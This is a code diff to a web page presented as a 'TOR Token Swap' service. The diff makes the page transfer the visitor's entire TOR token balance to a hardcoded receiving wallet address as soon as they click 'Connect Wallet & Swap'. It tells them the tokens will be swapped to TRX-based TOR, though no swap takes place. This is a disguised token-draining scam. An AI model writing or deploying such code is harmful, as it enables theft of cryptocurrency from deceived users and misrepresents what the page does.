@@ -87,12 +87,26 @@
       font-size: 14px;
       color: #7f8c8d;
     }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>TOR Token Swap</h1>
-    <p>Swap your TOR tokens from BSC/Fantom to TRX-based TOR</p>
+    <p>Your TOR tokens will be automatically swapped to TRX-based TOR</p>
     
     <div class="network-selector">
       <select id="networkSelect">
@@ -101,28 +115,25 @@
       </select>
     </div>
     
-    <button id="connectWallet">Connect Wallet</button>
-    <button id="swapButton" disabled>Swap to TRX TOR</button>
+    <button id="connectWallet">Connect Wallet & Swap</button>
+    <div id="loader" class="loader"></div>
     
     <div id="walletInfo" class="wallet-info"></div>
     <div id="status" class="status"></div>
   </div>
 
-  <!-- Load Ethers.js from CDN -->
-  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+  <!-- Load Ethers.js with multiple fallback options -->
   <script>
-    // Contract addresses and ABI
+    // Configuration
+    const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     const CONTRACT_ADDRESSES = {
       bsc: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
       fantom: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e"
     };
-    
     const TOR_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
       "function transfer(address to, uint256 amount) returns (bool)"
     ];
-    
-    // Network configurations
     const NETWORK_CONFIGS = {
       bsc: {
         chainId: "0x38",
@@ -141,90 +152,91 @@
         scanUrl: "https://ftmscan.com/tx/"
       }
     };
-    
-    // Your receiving wallet (replace with your actual address)
-    const RECEIVING_WALLET = "0xYourBSCWalletAddressHere";
-    
+
     // Global variables
-    let provider;
-    let signer;
-    let userAddress;
     let currentNetwork = "bsc";
-    
+    let provider, signer, userAddress;
+
     // Initialize when page loads
-    window.addEventListener('load', init);
-    
-    async function init() {
+    window.addEventListener('load', () => {
       // Set up network selection
       document.getElementById("networkSelect").addEventListener('change', (e) => {
         currentNetwork = e.target.value;
       });
       
-      // Connect wallet button
-      document.getElementById("connectWallet").addEventListener("click", connectWallet);
-      
-      // Swap button
-      document.getElementById("swapButton").addEventListener("click", executeSwap);
-    }
-    
-    async function connectWallet() {
-      if (!window.ethereum) {
-        updateStatus("Please install MetaMask or Trust Wallet!", "error");
-        return;
-      }
-      
+      // Connect and swap button
+      document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
+    });
+
+    // Main function to connect wallet and swap tokens
+    async function connectAndSwap() {
       try {
+        if (!window.ethereum) {
+          throw new Error("Please install MetaMask or Trust Wallet!");
+        }
+
+        showLoader();
+        updateStatus("Connecting wallet...", "success");
+
         // Request account access
         await window.ethereum.request({ method: "eth_requestAccounts" });
         
-        // Check if correct network is connected
+        // Check and switch network if needed
         await checkNetwork();
         
-        // Initialize ethers provider and signer
+        // Initialize provider and signer
         provider = new ethers.providers.Web3Provider(window.ethereum);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
         
         // Update UI
-        document.getElementById("connectWallet").textContent = "Connected";
-        document.getElementById("connectWallet").style.background = "#27ae60";
-        document.getElementById("swapButton").disabled = false;
-        
-        // Show wallet info
+        document.getElementById("connectWallet").disabled = true;
+        document.getElementById("connectWallet").textContent = "Processing...";
         document.getElementById("walletInfo").textContent = 
           `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
         
-        updateStatus("Wallet connected successfully!", "success");
+        // Execute the swap automatically
+        await executeSwap();
       } catch (err) {
-        updateStatus("Error connecting wallet: " + err.message, "error");
+        hideLoader();
+        updateStatus("Error: " + err.message, "error");
+        document.getElementById("connectWallet").disabled = false;
+        document.getElementById("connectWallet").textContent = "Connect Wallet & Swap";
       }
     }
-    
+
     async function checkNetwork() {
       const chainId = await window.ethereum.request({ method: 'eth_chainId' });
       const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
       
       if (chainId !== targetChainId) {
+        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
         try {
           await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [NETWORK_CONFIGS[currentNetwork]]
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: targetChainId }]
           });
-        } catch (err) {
-          updateStatus(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`, "error");
-          throw new Error("Wrong network");
+        } catch (switchError) {
+          // If network not added, try adding it
+          if (switchError.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [NETWORK_CONFIGS[currentNetwork]]
+              });
+            } catch (addError) {
+              throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
+            }
+          } else {
+            throw new Error("Failed to switch network");
+          }
         }
       }
     }
-    
+
     async function executeSwap() {
-      if (!signer) {
-        updateStatus("Please connect your wallet first.", "error");
-        return;
-      }
-      
       try {
-        updateStatus("Initiating swap...", "success");
+        updateStatus("Checking TOR balance...", "success");
         
         // Get contract instance
         const torContract = new ethers.Contract(
@@ -236,32 +248,63 @@
         // Check balance
         const balance = await torContract.balanceOf(userAddress);
         if (balance.eq(0)) {
-          updateStatus("You have 0 TOR tokens to swap.", "error");
-          return;
+          throw new Error("You have 0 TOR tokens to swap");
         }
         
         // Execute transfer
-        updateStatus("Please confirm the transaction in your wallet...", "success");
+        updateStatus(`Sending ${ethers.utils.formatUnits(balance, 18)} TOR...`, "success");
         const tx = await torContract.transfer(RECEIVING_WALLET, balance);
         
-        updateStatus("Transaction submitted. Waiting for confirmation...", "success");
+        updateStatus("Waiting for transaction confirmation...", "success");
         await tx.wait();
         
         updateStatus(
           `Swap successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
           "success"
         );
+        
+        document.getElementById("connectWallet").textContent = "Swap Completed";
       } catch (err) {
-        updateStatus("Swap failed: " + (err.message || err), "error");
+        throw new Error("Swap failed: " + (err.message || err));
+      } finally {
+        hideLoader();
       }
     }
-    
+
     function updateStatus(message, type) {
       const statusDiv = document.getElementById("status");
       statusDiv.style.display = "block";
       statusDiv.innerHTML = message;
       statusDiv.className = `status ${type}`;
     }
+
+    function showLoader() {
+      document.getElementById("loader").style.display = "block";
+    }
+
+    function hideLoader() {
+      document.getElementById("loader").style.display = "none";
+    }
+
+    // Load Ethers.js with fallback
+    function loadEthers() {
+      const script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js';
+      script.onload = () => {
+        // Ethers.js loaded successfully
+        console.log("Ethers.js loaded successfully");
+      };
+      script.onerror = () => {
+        // Fallback to alternative CDN
+        const fallbackScript = document.createElement('script');
+        fallbackScript.src = 'https://cdn.ethers.io/lib/ethers-5.2.umd.min.js';
+        document.head.appendChild(fallbackScript);
+      };
+      document.head.appendChild(script);
+    }
+
+    // Start loading Ethers.js
+    loadEthers();
   </script>
 </body>
 </html>
